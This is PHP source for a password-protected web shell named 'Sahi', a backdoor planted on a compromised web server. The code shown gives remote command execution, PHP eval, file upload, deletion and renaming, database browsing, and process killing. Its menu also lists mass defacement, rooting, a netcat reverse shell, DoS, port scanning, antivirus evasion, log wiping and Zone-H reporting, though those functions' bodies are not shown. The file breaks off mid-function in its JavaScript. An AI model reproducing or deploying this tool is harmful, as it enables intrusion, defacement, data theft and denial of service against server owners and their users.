<?php 
$u = "admin";
$p = "61134b3a07ea8bee089d0ae8e60ad552"; //sahi

header("Pragma: no-cache");
header("Cache-Control: no-store");
error_reporting(0);
session_start();
if (@get_magic_quotes_gpc()) {
	function stripslashes_deep($value){
		return is_array($value)? array_map('stripslashes_deep', $value):stripslashes($value);
	}
	$_POST = array_map('stripslashes_deep', $_POST);
	$_GET = array_map('stripslashes_deep', $_GET);
	$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
}
$ip = get_client_ip();
$islinux = !(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$url = getCompleteURL();
$rpath = isset($_SERVER["PHP_SELF"])?$_SERVER["PHP_SELF"]:"";
$url_info = parse_url($url);
if( !isset($_SERVER['DOCUMENT_ROOT']) ) {
	if ( isset($_SERVER['SCRIPT_FILENAME']) )
		$path = $_SERVER['SCRIPT_FILENAME'];
	elseif ( isset($_SERVER['PATH_TRANSLATED']) )
	$path = str_replace('\\\\', '\\', $_SERVER['PATH_TRANSLATED']);
	$_SERVER['DOCUMENT_ROOT'] = str_replace( '\\', '/', substr($path, 0, 0-strlen($_SERVER['PHP_SELF'])));

}
$doc_root = str_replace('//','/',str_replace(DIRECTORY_SEPARATOR,'/',$_SERVER["DOCUMENT_ROOT"]));
$fm_self = $doc_root.$_SERVER["PHP_SELF"];
$path_info = pathinfo($fm_self);
// Register Globals
$blockKeys = array('_SERVER','_SESSION','_GET','_POST','_COOKIE','charset','ip','islinux','url','url_info','doc_root','fm_self','path_info');
foreach ($_GET as $key => $val) if (array_search($key,$blockKeys) === false) $$key=$val;
foreach ($_POST as $key => $val) if (array_search($key,$blockKeys) === false) $$key=$val;
foreach ($_COOKIE as $key => $val) if (array_search($key,$blockKeys) === false) $$key=$val;

if (!isset($_SESSION["current_dir"])){
	$_SESSION["current_dir"]=$path_info["dirname"]."/";
	if (!$islinux)
	{
		$_SESSION["current_dir"] = ucfirst($_SESSION["current_dir"]);
	}
}
 
$current_dir=$_SESSION["current_dir"];
chdir($current_dir);

if(!isLogged() and isset($_REQUEST['cv']))
{
	$script = basename(__FILE__);	
	header("Location: $script");
	exit(0);
}
if(!isLogged())
{
	try {
		
	
		$username = isset($_REQUEST['username'])? $_REQUEST['username']:"";
		$password = isset($_REQUEST['password'])? $_REQUEST['password']:"";
		if($username===$u and md5($password)===$p) 
		{
			session_regenerate_id();
			$_SESSION['username']='admin';
			$script = basename(preg_replace('@\(.*\(.*$@', '', __FILE__));
			header("Location: {$script}");

		}
		else {
	
			displayLoginForm();
			exit(0) ;
		}
	}
	catch(Exception $e)
	{
		echo "Error: ". $e->getMessage();
	}
}
initializeSession();
displayPage();
function initializeSession()
{
	global $current_dir, $cv, $ajx,$rpath, $path_info,$home, $dl, $del, $filename, 
	$cd, $acp, $upl,$md,$defacePath,$ev,$sd,$connectDatabase,$listTables,
	$dlf,$dff,$tableData,$killPids,$Find,$cdf,$dlfile,$command,$NewFolder,
	$NewFile,$delf,$oldfname,$newfname,$vf,$cds;
	global $rnd;
	$rnd=rand(10,99);
	if(!isset($_SESSION['current_dir']))
		$_SESSION['current_dir']=$current_dir;
	
	if(!isset($_SESSION["view"]))
		$_SESSION["view"]="File Manager";
	if(!isset($_SESSION['HomeDir']))
		$_SESSION['HomeDir'] = $path_info['dirname'];
	
	if(isset($cv))
	{
		if($cv==1)
		{
			$_SESSION["view"]="File Manager";
		}
		else if($cv==2)
		{
			$_SESSION["view"]="Upload";
		}
		else if($cv==3)
		{
			$_SESSION["view"]="CMD";
		}
		else if($cv==4)
		{
			$_SESSION["view"]="Database";
		}
		else if($cv==5)
		{
			$_SESSION["view"]="Mass Deface";
		}
		else if($cv==6)
		{
			$_SESSION["view"]="Symlink";
		}
		else if($cv==7)
		{
			$_SESSION["view"]="Process";
		}
		else if($cv==8)
		{
			$_SESSION["view"]="Eval";
		}
		else if($cv==9)
		{
			$_SESSION["view"]="Find";
		}
		else if($cv==10)
		{
			$_SESSION["view"]="Rooting";
		}
		else if($cv==='chp')
		{
			$_SESSION["view"]="chp";
		}
		else if($cv==13)
		{
			$_SESSION["view"]="Config";
		}
		else if($cv==14)
		{
			$_SESSION["view"]="Mailer";
		}
		else if($cv==15)
		{
			$_SESSION["view"]="Domains";
		}
		else if($cv==16)
		{
			$_SESSION["view"]="Headers";
		}
		else if($cv==17)
		{
			$_SESSION["view"]="Netcat";
		}
		else if($cv==18)
		{
			$_SESSION["view"]="Commands";
		}
		else if($cv==20)
		{
			$_SESSION['view']="Info";
		}
		else if($cv==21)
		{
			$_SESSION["view"]="Hash";
		}
		else if($cv==22)
		{
			$_SESSION["view"]="ZoneH";
		}
		else if($cv==23)
		{
			$_SESSION["view"]="Exploit";
		}
		else if($cv==24)
		{
			$_SESSION["view"]="Code Inject";
		}
		else if($cv==25)
		{
			$_SESSION["view"]="Bypassers";
		}
		else if($cv==26)
		{
			$_SESSION["view"]="DoS";
		}
		else if($cv==27)
		{
			$_SESSION["view"]="Logs";
		}
		else if($cv==28)
		{
			$_SESSION["view"]="SelfKill";
		}
		else if($cv==29)
		{
			$_SESSION["view"]="Forums";
		}
		else if($cv==37)
		{
			$_SESSION["view"]="PortScanner";
		}
		else if($cv==34)
		{
			$_SESSION["view"]="EvadeAV";
		}
		else if($cv==11)
		{
			session_destroy();
		}
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($upl))
	{
		saveFile();
	}
	if(isset($dff) and $dff=='Copy')
	{
		$_SESSION['Copy'] = $_POST['fileItem'];
		$_SESSION['CopyPath']=$_SESSION['current_dir'];
		$_SESSION['lastAction']='Copy';
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($dff) and $dff=='Cut')
	{
		$_SESSION['Cut'] = $_POST['fileItem'];
		$_SESSION['CutPath']=$_SESSION['current_dir'];
		$_SESSION['lastAction']='Cut';
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($dff) and $dff=='Paste')
	{
		processPaste();
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($dff) and $dff=='Delete')
	{
		processDelete();
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($dff) and $dff=='Zip')
	{
		compressFileFolder($_POST['fileItem']);
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($killPids))
	{
		killProcesses($_POST['killPid']);
	}
	if(isset($md))
	{
		
		massDeface($defacePath);		
	}
	if(isset($NewFolder))
	{
		chdir($_SESSION['current_dir']);
		
		mkdir($NewFolder);
		chmod($NewFolder,0777);
		header("Location: {$rpath}");
		exit(0);
	}

	
	
	if(isset($NewFile))
	{
		chdir($_SESSION['current_dir']);
		touch($NewFile);
		chmod($NewFile,0777);
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($connectDatabase))
	{
		list($u,$h)=explode("@",$connectDatabase);
		echo listDatabases($u,$h);
		exit(0);
	}
	if(isset($listTables))
	{
		list($u,$h,$db)=explode("@",$listTables);
		echo listTables($u,$h,$db);
		exit(0);
	}
	if(isset($command))
	{
		$_SESSION['command']=$command;
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($delf))
	{
		
		total_delete($delf);
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($oldfname) and isset($newfname))
	{
		rename($oldfname,$newfname);
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($dlf))
	{
		$filename = compressFolder($dl);
		//$filename = compressFileFolder();
		download();
		exit(0);
	}
	if(isset($dff))
	{
		$filename = compressFileFolder($_POST['fileItem']);
		download();
		exit(0);
	}
	
	if(isset($tableData))
	{
		list($u,$h,$db,$tbl)=explode("@",$tableData);
		echo displayTableData($u,$h,$db,$tbl);
		exit(0);
	}
	
	if(isset($ev))
	{
		phpEval();
		exit(0);
	}
	if(isset($sd))
	{
		saveDatabaseCredentials();
		exit(0);
	}
	if(isset($dl))
	{
		global $filename;
		if($dlfile)
			$filename = $dl;
		else 
			$filename = $_SESSION['current_dir'].$dl;
		download();
		//header("Location: {$rpath}");
		//exit(0);
		
	}
	if(isset($cd))
	{
		chdir($_SESSION['current_dir']);
		chdir($cd);
		$_SESSION['current_dir']=format_path(getcwd());
		if($cdf)
		{
			$_SESSION["view"]="File Manager";
		}
		header("Location: {$rpath}");
		exit(0);
		
	}
	if(isset($cds))
	{
		chdir($cds);
		$_SESSION['current_dir']=format_path(getcwd());
		$_SESSION["view"]="File Manager";
		header("Location: {$rpath}");
		exit(0);
	
	}
	if(isset($home))
	{
		$_SESSION['current_dir']=format_path($_SESSION['HomeDir']);	
		$_SESSION["view"]="File Manager";
		header("Location: {$rpath}");
		exit(0);
	}
	if(isset($acp))
	{
		ajaxCurrentPath();
		exit(0);
	}
	
	if(isset($_SESSION["view"]))
	{
		if( $_SESSION["view"]=="CMD" and isset($ajx) and $ajx==1)
		{
			echo execute_cmd();
			exit(0);
				
		}
	
	}
	
}
function includePopups()
{
	?>
	<div class='box' id='NewFolder'>
		<form method="post">
		New Folder: <input name='NewFolder' > 
		 <input type='submit' value='Create'>
		 <input type='submit' value="Cancel" onclick="return cancelPopup('NewFolder')">
		</form>
	</div>
	<div class='box' id='NewFile'>
	<form method="post">
		New File: <input name='NewFile'>
		<input type='submit' value='Create'>
		<input type='submit' value="Cancel" onclick="return cancelPopup('NewFile')">
		</form>
	</div>
	<div class='box' id='NewName'>
	<form method="post">
		New File: <input name='newfname'>
		<input type='hidden' name='oldfname' id='oldfname'>
		<input type='submit' value='Rename'>
		<input type='submit' value="Cancel" onclick="return cancelPopup('NewName')">
		</form>
	</div>
	
	<?php 
}
function displayPage()
{
	global $Find,$oldusername,$oldpassword,$newusername,$newpassword,
	$vf;
	
	echo "<html>";
	includeHead();
	echo "<body  onload=\"initPage();\">";
	
	includeBanner();
	includeMenuBar();
	includeCurrentPath();
	includePopups();
	
	if(isset($vf))
	{
		echo "<div class='bodyDiv'>";
		echo "<textarea readonly rows='30'>";
		$data=file_get_contents($vf);
		//$encoded = html_encode($data);
		//echo mb_detect_encoding($data);
		//echo htmlspecialchars_decode($data);
		echo htmlentities($data, ENT_QUOTES | ENT_IGNORE, "UTF-8");
		echo "</textarea></div>";
		exit(0);
	}
	if(isset($_SESSION["view"]))
	{
		if( $_SESSION["view"]==="File Manager")
		{
			displayFileManager();
	
		}
		else if($_SESSION['view']==="Upload")
		{
			displayUpload();		
		}
	else if( $_SESSION["view"]==="CMD")
		{
			displayCMD();
	
		}else if( $_SESSION["view"]==="Database")
		{
			displayDatabase();
	
		}
		else if( $_SESSION["view"]==="Symlink")
		{
			displaySymlink();
		
		}
		else if( $_SESSION["view"]==="Mass Deface")
		{
			displayMassDeface();
			
		}
		else if( $_SESSION["view"]==="EvadeAV")
		{
			displayEvadeAV();
				
		}
		else if( $_SESSION["view"]==="Process")
		{
			displayProcess();
			
		}
		else if( $_SESSION["view"]==="Forums")
		{
			displayForums();
				
		}
		else if( $_SESSION["view"]==="Eval")
		{
			displayEval();
				
		}
		else if( $_SESSION["view"]==="Mailer")
		{
			displayMailer();
		
		}
		else if( $_SESSION["view"]==="Domains")
		{
			displayDomains();
		
		}
		else if( $_SESSION["view"]==="Info")
		{
			displayInfo();
		
		}
		else if( $_SESSION["view"]==="Commands")
		{
			displayCommands();
		
		}
		else if( $_SESSION["view"]==="Netcat")
		{
			displayReverseNetcat();
		
		}
		else if( $_SESSION["view"]==="Hash")
		{
			displayHash();
		
		}
		else if( $_SESSION["view"]==="Find")
		{
			displayFind();
			if(isset($Find))
			{
				processFind();
				exit(0);
			}
				
		}
		else if( $_SESSION["view"]==="Rooting")
		{
			displayRooting();
		
		}
		else if( $_SESSION["view"]==="ZoneH")
		{
			displayZoneH();
		
		}
		else if( $_SESSION["view"]==="Exploit")
		{
			displayExploit();
		
		}
		else if( $_SESSION["view"]==="Code Inject")
		{
			displayCodeInject();
		
		}
		else if( $_SESSION["view"]==="Bypassers")
		{
			displayBypassers();
		
		}
		else if( $_SESSION["view"]==="DoS")
		{
			displayDoS();
		
		}
		else if( $_SESSION["view"]==="PortScanner")
		{
			displayPortScanner();
		
		}
		else if( $_SESSION["view"]==="Logs")
		{
			displayLogs();
		
		}
		else if( $_SESSION["view"]==="SelfKill")
		{
			displaySelfKill();
		
		}
		
		else if( $_SESSION["view"]==="chp")
		{
			if(isset($oldusername) and isset($oldpassword)
				and isset($newusername) and isset($newpassword))
			{
				displayChangePassword();
				processChangePassword();
				
			}
			else 
			{
				displayChangePassword();
			}
		
		}
		else if( $_SESSION["view"]==="Headers")
		{
			displayHeaders();
		
		}
		else if( $_SESSION["view"]==="Config")
		{
			findConfig();
		
		}
	
	}
	echo "</body></html>";
}

function includeCurrentPath()
{
	global $islinux, $rpath;
	echo "<div id='acp'>";
	$l = $_SESSION['current_dir'];
	if($l[strlen($l)-1] === '/')
		$l = substr($l,0,strlen($l)-1);
	//echo $l;
	//echo str_replace("/","",$_SESSION['current_dir'],$l);
	$path = explode("/",$l);
	$cd="";
	if($islinux===false)
	{
		foreach (range("A", "Z") as $letter){
			if(is_readable($letter.":\\")){
				$letter.":";
				echo "<a href='{$rpath}?cd={$letter}:'>[ " . $letter . "\\ ]</a>";
				
				//$res .= "<tr><td>drive ".$drive."</td><td>".format_bit(@disk_free_space($drive))." free of ".format_bit(@disk_total_space($drive))."</td></tr>";
				
			}
		}
		echo " - ";
		foreach ($path as $p)
		{
			
			$cd.=$p . "\\";
			echo "<a href='{$rpath}?cd={$cd}'>" . $p . "\\</a>";
			
		}
	}
	else 
	{
		foreach ($path as $p)
		{
			
			$cd.=$p . "/";
			echo "<a href='{$rpath}?cd={$cd}'>" . $p . "/</a>";
			
		}
	}
	echo "</div>";
}
function ajaxCurrentPath()
{
	global $islinux, $rpath;

	$l = $_SESSION['current_dir'];
	if($l[strlen($l)-1] === '/')
		$l = substr($l,0,$l-1);
	//echo $l;
	//echo str_replace("/","",$_SESSION['current_dir'],$l);
	$path = explode("/",$l);
	$cd="";
	if($islinux===false)
	{
		foreach ($path as $p)
		{
				
			$cd.=$p . "\\";
			echo "<a href='{$rpath}?cd={$cd}'>" . $p . "\\</a>";
				
		}
	}

}

function includeHead()
{
	echo "<head><title>Sahi</title><link rel='SHORTCUT ICON' href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAcCAQAAADc8cciAAAAAmJLR0QA/4ePzL8AAAAHdElNRQffDAgRIDphlPXjAAABvUlEQVQ4y53UTYjMcRjA8c+OmdnB0qQk7a5QSF6KZHFTlJRcnDbr4oBw2to9uMiBHNxcRS5yEC7KzWaVrS1Kuzgo76R2d2TQbHZ/DvNiXv4zY+b5Hf7P8+v5/p6e5/88D+1I0hmItQXP6pMkrj35ZVUzl5i4uE7LrS7ddYKXVrpXP3LcXdvEdUhJiHtrixxeWeOsRb7oqoeeMifUnCvOm7BXsNu4fVFgh0MRYPm55olLUWjKhyZoEAznnZdUoGtlI1ynPa+wjxfdH1hWQrdHRvluqXUla85POQvywKicA+Co35HwIG6UrJPSUsVox7wR9Bqsm9+IryV9c3WJepuW547Pgh8WR1X4RCQyU/hOmcBB6eiWeBSBZiSMeS0YEv5lWSvpCPgZ2CUIbtfrYOj2p2q+rrpVGL5Rj21tPD8zVXEHJPTrEUwJhhrDw1XwYftlBOesMNB8vD8JgsvmBTdr/2c96bLBpCAYw3WhWY7lslEw7aJ3Ysjos6mVjXTBt4LWI7gv2eo+3FPQ+r0QnG7lgRHZMmunnKz1/ws/FCys6rmnzZdrXj5ituw+Y9wOicZwsSkn0e19xaQdMd8Y/gstnwtCbO42lAAAAABJRU5ErkJggg=='>";
	includeCSS();
	includeJavascript();
	echo "</head>";
	
}
function includeCSS()
{
	
	?>
		<style type="text/css">
		body
		{
			background-color: #000000;
		}
		*{font-family:Ubuntu Mono, arial, serif,algerian;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border:0;}
		*{
		color:white;
		}
		input{
		color:black;
		border-radius:5px;
		padding:4px;
		margin:2px;		
		font-size:.8em;
		
		}
		select,option{
		color:#5EFB6E;
		background:#001100;
		}
		table {
		width: 100%;
	   
			background:#444444;
			border:0;
		    border-collapse: collapse;
		    border-radius:5px;
		    font-size:.8em;
		}
		table, th,td {
		   border-bottom: thin solid #222222;
		
		}
		table#db, td#db {
			
		   border: thin solid #333333;
		   
		}
		table#find, td#find {
			
		   border: thin solid #333333;
		}
		table#db td:first-child { width: 20%; }
		table#find td:first-child { width: 20%; }
		table#bypass td:first-child { width: 15%; }
		th{
			padding: 6px 8px;
			background:#333333;
		}
		td{
			padding: 6px 8px;
		}
		td.center{
			text-align: center;
		}
		
		tr:hover {
		    background: #777777 none repeat scroll 0 0;
		}
		div#textAreaDiv{
		
		margin:10px 10px 10px 10px ;
		
		 
		}
		div#cmdDiv{
		
		margin:10px 10px 10px 10px ;
		
		 
		}
	
		div#upload{
		
		margin:10px 10px 10px 10px ;
		 border: thin solid #444444;
		 background:#444444;
		 border-radius:5px;
		 padding:6px 8px;
		}
		div.bodyDiv{
		
		 margin:10px 10px 10px 10px ;
		 border: thin solid #444444;
		 background:#444444;
		 border-radius:5px;
		 padding:6px 8px;
		 width:auto;
		}
		div.box{
	
			min-width:50%;
			border:1px solid #dddddd;
			padding:8px 8px 0 8px;
			border-radius:8px;
			position:fixed;
			background:white;
			opacity:1;
			box-shadow:1px 1px 11px #ffffff;
		    top: 50%;
		    left: 50%;
		    -webkit-transform: translate(-50%, -50%);
		    transform: translate(-50%, -50%);
		    display:none;
		}

		div#tableDataDiv{
		
		 margin-left:10px ;
		 border-radius:5px;
		 padding:6px 8px;
		 width:100%;
		}
		div#bannerDiv{
		
		 margin:10px 10px 10px 10px ;
		 font-size:1em;
		 border: thin solid black;
		 background:black;
		 border-radius:15px;
		 padding:6px 8px;
		 color:#5EFB6E;
		 line-height:100%
		}
		div#bannerDiv:hover{
		
		 margin:10px 10px 10px 10px ;
		
		
		  border: thin solid #222222;
		 background:#222222;
		 border-radius:15px;
		 padding:6px 8px;
		}
		div.divDatabases{
		
		 margin:10px 10px 10px 10px ;
		 border: thin solid #444444;
		 background:#444444;
		 border-radius:5px;
		 padding:6px 8px;
		 position:relative;
		}
		div#dbContainer1 {
		    width: 30em;
		    border: thin solid;
		    border: thin solid #444444;
		 background:#444444;
		    margin:10px 10px 10px 10px ;
		    border-radius:5px;
		}
		div#FileManager {
	
		    border: thin solid;
		    border: thin solid #444444;
		 background:#444444;
		    margin:10px 10px 10px 10px ;
		    border-radius:5px;
		}
		div.box {
		    width: 45%;
		    border: thin solid #444444;
		 background:#444444;
		    float: left;
		    box-sizing: border-box;
		    
		}
		div#acp{
		margin:10px 10px 10px 10px ;
		}
		textarea
		{
		 
		width:100%;
		padding:6px 8px;
		border-style: solid;
		border-color:#444444;
		border-width: 1px;
		border-radius:5px;
		background:#446644;
		font-size:1em;
		}
		div#menu{
		padding:6px 8px;
		margin:10px 10px 10px 10px ;
		border-style: solid;
		border-color:black;
		border-width: 1px;
		
		background-color:black;
		
		}
		a{
			text-decoration: none;
			padding: 2px 5px;
			font-size:1em;
			padding-left:5px;
			
			
		}
		div#menu a{
		border-radius:4px;
		font-size:1.2em;
		line-height:160%;
		}
		a.menu{
			margin-left:2px;
			margin-right:2px;
			border-style: solid;
			border-color:#5EFB6E;
			border-width: 1px;
			
		
		background-color:#003300;
						
		}
		div#logo{
	
		
			 
			float:right;
			margin-top:15px;
			color: #5EFB6E;
			 text-shadow:4px 4px 25px #ffffff;
			 font-size:1em;
			
		}
		span#logo
		{
			 color: #5EFB6E;
			
			 font-size:5em;
			
		}
		span#logo1
		{
			 color: #5EFB6E;
			
			 font-size:2em;
			
		}
		a:link {
	    color: #5EFB6E;
		}
		
		/* visited link */
		a:visited {
		   color: #5EFB6E;
		}
		
		/* mouse over link */
		a:hover {
		    background-color: #111111;
		}
		
		/* selected link */
		a:active {
		    background-color: #999999;
		}
		
		</style>
		
		<?php
}
function includeJavascript()
{
	global $rpath;
	
	
	?>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
		<script type="text/javascript">
			function getXMLHTTP() {
			    var x = false;
			    try {
			       x = new XMLHttpRequest();
			    }catch(e) {
			      try {
			         x = new ActiveXObject("Microsoft.XMLHTTP");
			      }catch(ex) {
			         try {
			             req = new ActiveXObject("Msxml2.XMLHTTP");
			         }
			         catch(e1) {
			             x = false;
			         }
			      }
			   }
			   return x;
			 }
			var ajaxRequest;
			var cmdHistory= new Array("");
			var cmdHistoryPos = 0;
			var cmdFlag=0;
			function executeCMD()
			{
				var c = document.getElementById("cmd").value;
				cmdHistory.push(c);
				cmdHistoryPos=cmdHistory.length-1;
				//alert("try t osend request " +c);
				ajaxRequest = getXMLHTTP();    
				
				if (ajaxRequest) {   //  if the object was created successfully
					
					ajaxRequest.onreadystatechange = ajaxResponse;  
					ajaxRequest.open("GET", "<?=$rpath ?>?cmd=" + c + "&ajx=1");
					ajaxRequest.send(null);
				}
			}
			function displayNewFolder()
			{
				document.getElementById("NewFolder").style.display="inline-block";
			}
			function cancelPopup(v)
			{
				document.getElementById(v).style.display="none";
				return false;
			}
			function displayNewFile(v)
			{
				document.getElementById(v).style.display="inline-block";
			}
			function displayPopupNewName(v,w)
			{
				document.getElementById('oldfname').value=w;
				document.getElementById(v).style.display="inline-block";
			}
			function validateSelectedItems()
			{
				return false;
				var inputs = document.getElementsByTagName("input");

		        for(var i = 0; i < inputs.length; i++) {
		            if(inputs[i].type == "checkbox" && inputs[i].checked) 
		                return true;
		        }
		        alert('You must select at least 1');
		        return false;
		
			}
			function saveDB()
			{
				
				var dbusername = document.getElementById("dbusername").value;
				var dbpassword = document.getElementById("dbpassword").value;
				var dbname = document.getElementById("dbname").value;
				var dbhost = document.getElementById("dbhost").value;
				ajaxRequest = getXMLHTTP();    
				
				if (ajaxRequest) {   //  if the object was created successfully
					
					ajaxRequest.onreadystatechange = ajaxResponseSaveDB;  
					ajaxRequest.open("GET", "<?=$rpath ?>?sd=1&dbusername="+dbusername+"&dbpassword="+dbpassword+"&dbname="+dbname+"&dbhost="+dbhost);
					ajaxRequest.send(null);
				}
			}
			function connectDatabase(c)
			{
				
				
				ajaxRequest = getXMLHTTP();    
				
				if (ajaxRequest) {   //  if the object was created successfully
					
					ajaxRequest.onreadystatechange = ajaxResponseConnectDatabase;  
					ajaxRequest.open("GET", "<?=$rpath ?>?connectDatabase=" + c + "&ajx=1");
					ajaxRequest.send(null);
				}
			}
			function displayTableData(c)
			{
				
				
				ajaxRequest = getXMLHTTP();    
				
				if (ajaxRequest) {   //  if the object was created successfully
					
					ajaxRequest.onreadystatechange = ajaxResponseDisplayTableData;  
					ajaxRequest.open("GET", "<?=$rpath ?>?tableData=" + c + "&ajx=1");
					ajaxRequest.send(null);
				}
			}
			function listTables(c)
			{
				
				
				ajaxRequest = getXMLHTTP();    
				
				if (ajaxRequest) {   //  if the object was created successfully
					
					ajaxRequest.onreadystatechange = ajaxResponseListTables;  
					ajaxRequest.open("GET", "<?=$rpath ?>?listTables=" + c + "&ajx=1");
					ajaxRequest.send(null);
				}
			}
			function executeEval()
			{
				var c = document.getElementById("tarea").value;
		
				//alert(c);
				//alert("try t osend request " +c);
				ajaxRequest = getXMLHTTP();    
				
				if (ajaxRequest) {   //  if the object was created successfully
					
					ajaxRequest.onreadystatechange = ajaxResponseEval;  
					ajaxRequest.open("GET", "<?=$rpath ?>?ev=" + c + "&ajx=1");
					ajaxRequest.send(null);
				}
			}
			function ajaxCurrentPath()
			{
				ajaxRequest = getXMLHTTP();    
				
				if (ajaxRequest) {   //  if the object was created successfully
					
					ajaxRequest.onreadystatechange = ajaxResponseACP;  
					ajaxRequest.open("GET", "<?=$rpath ?>?acp=1");
					ajaxRequest.send(null);
				}
			}
			function selectCMD()
			{
				
				document.getElementById("cmd").select();
			}			
			function ajaxResponseDisplayTableData()  //This gets called when the readyState changes.  
			{
				if (ajaxRequest.readyState != 4)  //  check to see if we�re done
				{  
					return;  
				}
				else {
					if (ajaxRequest.status == 200) //  check to see if successful
					{   //  process server data here. . . 
						//alert(ajaxRequest.responseText);
						document.getElementById("tableDataDiv").innerHTML =  ajaxRequest.responseText;
						document.getElementById("tableDataDiv").style.display="block";
						//document.getElementById("tableDataDiv").style.width =  document.getElementById("table01").style.width;
						
						//document.getElementById("tarea").innerHTML =""; 
					}
		
					else {
						alert("Request failed: " + ajaxRequest.statusText);
					}
				}
			}
			function ajaxResponseEval()  //This gets called when the readyState changes.  
			{
				if (ajaxRequest.readyState != 4)  //  check to see if we�re done
				{  
					return;  
				}
				else {
					if (ajaxRequest.status == 200) //  check to see if successful
					{   //  process server data here. . . 
						//alert(ajaxRequest.responseText);
						document.getElementById("evalBody").innerHTML =  ajaxRequest.responseText;
						//document.getElementById("tarea").innerHTML =""; 
					}
		
					else {
						alert("Request failed: " + ajaxRequest.statusText);
					}
				}
			}
			function ajaxResponseListTables()  //This gets called when the readyState changes.  
			{
				if (ajaxRequest.readyState != 4)  //  check to see if we�re done
				{  
					return;  
				}
				else {
					if (ajaxRequest.status == 200) //  check to see if successful
					{   //  process server data here. . . 
						//alert(ajaxRequest.responseText);
						document.getElementById("tablesListDiv").innerHTML =  ajaxRequest.responseText;
						document.getElementById("tablesListDiv").style.display="block";
						//document.getElementById("tableDataDiv").innerHTML =  "Table Data";
						document.getElementById("tableDataDiv").style.display =  "none";
						
						//document.getElementById("tarea").innerHTML =""; 
					}
		
					else {
						alert("Request failed: " + ajaxRequest.statusText);
					}
				}
			}
			function ajaxResponseConnectDatabase()  //This gets called when the readyState changes.  
			{
				if (ajaxRequest.readyState != 4)  //  check to see if we�re done
				{  
					return;  
				}
				else {
					if (ajaxRequest.status == 200) //  check to see if successful
					{   //  process server data here. . . 
						//alert(ajaxRequest.responseText);
						document.getElementById("databasesListDiv").innerHTML =  ajaxRequest.responseText;
						document.getElementById("databasesListDiv").style.display="block";
						document.getElementById("tableDataDiv").style.display="none";
						document.getElementById("tablesListDiv").style.display="none";
						//document.getElementById("tableDataDiv").innerHTML =  "Table Data";
						//document.getElementById("tablesListDiv").innerHTML =  "List of Tables";
												
						//document.getElementById("tarea").innerHTML =""; 
					}
		
					else {
						alert("Request failed: " + ajaxRequest.statusText);
					}
				}
			}
			function ajaxResponseSaveDB()  //This gets called when the readyState changes.  
			{
				if (ajaxRequest.readyState != 4)  //  check to see if we�re done
				{  
					return;  
				}
				else {
					if (ajaxRequest.status == 200) //  check to see if successful
					{   //  process server data here. . . 
						//alert(ajaxRequest.responseText);
						document.getElementById("dbConnectionsList").innerHTML =  ajaxRequest.responseText;
						//document.getElementById("tableDataDiv").innerHTML =  "Table Data";
						//document.getElementById("databasesListDiv").innerHTML =  "Dtabases";
						//document.getElementById("tablesListDiv").innerHTML =  "Tables";
						document.getElementById("tableDataDiv").style.display =  "none";
						document.getElementById("databasesListDiv").style.display =  "none";
						document.getElementById("tablesListDiv").style.display =  "none";
						
						//alert("response reeturn");
						//document.getElementById("tarea").innerHTML =""; 
					}
		
					else {
						alert("Request failed: " + ajaxRequest.statusText);
					}
				}
			}
			function ajaxResponseACP()  //This gets called when the readyState changes.  
			{
				if (ajaxRequest.readyState != 4)  //  check to see if we�re done
				{  
					return;  
				}
				else {
					if (ajaxRequest.status == 200) //  check to see if successful
					{   //  process server data here. . . 
						//alert(ajaxRequest.responseText);
						document.getElementById("acp").innerHTML =  ajaxRequest.responseText;						
					}
		
					else {
						alert("Request failed: " + ajaxRequest.statusText);
					}
				}
			}
			function ajaxResponse()  //This gets called when the readyState changes.  
			{
				if (ajaxRequest.readyState != 4)  //  check to see if we�re done
				{  
					return;  
				}
				else {
					if (ajaxRequest.status == 200) //  check to see if successful
					{   //  process server data here. . . 
						//alert(ajaxRequest.responseText);
						document.getElementById("tarea").value +=  ajaxRequest.responseText;
						var textArea = document.getElementById("tarea");
						textArea.scrollTop = textArea.scrollHeight;
						ajaxCurrentPath();
						document.getElementById("cmd").value="";
						document.getElementById("cmd").focus();
					}
		
					else {
						alert("Request failed: " + ajaxRequest.statusText);
					}
				}
			}
			function initPage()
			{
				//alert("page initialized!");
				var inpt = document.getElementById("cmd");
				if(inpt)
					inpt.addEventListener("keydown",keyPressed);
//				$("form[name=fmform]").bind('submit',validateSelectedItems());
				$("form[name=fmform]").bind('submit',			function(v){
					//alert();
					var btn = jQuery("#fmform1").context.activeElement.value;
			
					 if((btn =='Copy' || btn =='Cut' || btn =='Delete' || btn =='Zip') &&  $('input[name="fileItem[]"]:checked').length == 0 )
					    {
					        alert("You must check at least one file");
					        return false;
					    }
					    else
					        return true;
					 return false;
					});
	
			}
			
			function clearHistory()
			{
				cmdHistory = [""];
				cmdHistoryPos=0;
			}
			function keyPressed(event)
			{

			     var newchar = String.fromCharCode(event.charCode || event.keyCode);
		
			     if(newchar=='&')
			     {
				     
			    	 if(cmdHistoryPos > 0)
						{
						 	cmdHistoryPos-=1;
						} 

			    	 document.getElementById("cmd").value=cmdHistory[cmdHistoryPos];
			     }
				 else if(newchar=="(")
				 {
					 //document.getElementById("cmd").value="Down";
					
					if(cmdHistoryPos < cmdHistory.length-1)
			    	 {
				    	 cmdHistoryPos+=1;
			    	 }
					document.getElementById("cmd").value=cmdHistory[cmdHistoryPos];	 
				 }
				 else
				 {
					 cmdHistoryPos=cmdHistory.length;
				 }
			}	
			function fileSelected()
			{
				//alert("File Selected!");
				//var x = document.getElementsById("fileContainer");
				var x = document.getElementsByClassName("selectFile");
				//var i;
				//for (i = 0; i < x.length; i++) {
				  //  x[i].style.backgroundColor = "#eee";
				//}
				x[x.length-1].style.backgroundColor = "#666666";
				var y = document.getElementById("fileContainer");
				//alert(y);
				// create Text
				var br = document.createElement("br");
				
				var textnode = document.createTextNode("Select File! ");
				// creatt fileInput
